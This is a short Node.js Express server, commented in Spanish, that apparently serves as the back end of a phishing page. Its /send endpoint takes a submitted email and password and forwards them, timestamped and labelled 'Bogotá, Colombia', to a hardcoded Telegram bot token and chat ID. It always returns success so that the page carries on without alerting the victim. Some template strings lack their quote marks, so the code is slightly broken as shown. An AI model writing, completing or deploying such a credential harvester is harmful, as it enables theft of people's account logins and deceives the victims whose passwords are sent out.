const express = require('express');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());

const BOT_TOKEN = "8663095160:AAGc7Bc6aKxreZ9f_vOPTiF52DuJIMEWMnM";
const CHAT_ID = "7948080660";

app.post('/send', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: "Datos incompletos" });
    }

    const message = 🔐 Nuevo registro - yeikill5_bot\n\n +
                    📧 Email: ${email}\n +
                    🔑 Contraseña: ${password}\n +
                    ⏰ Hora: ${new Date().toLocaleString('es-CO')}\n +
                    🌎 Bogotá, Colombia;

    try {
        await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log(✅ Datos recibidos y enviados: ${email});
    } catch (err) {
        console.error("Error enviando al bot:", err);
    }

    // Siempre respondemos OK para que la página continúe
    res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(Servidor corriendo en puerto ${PORT});
});
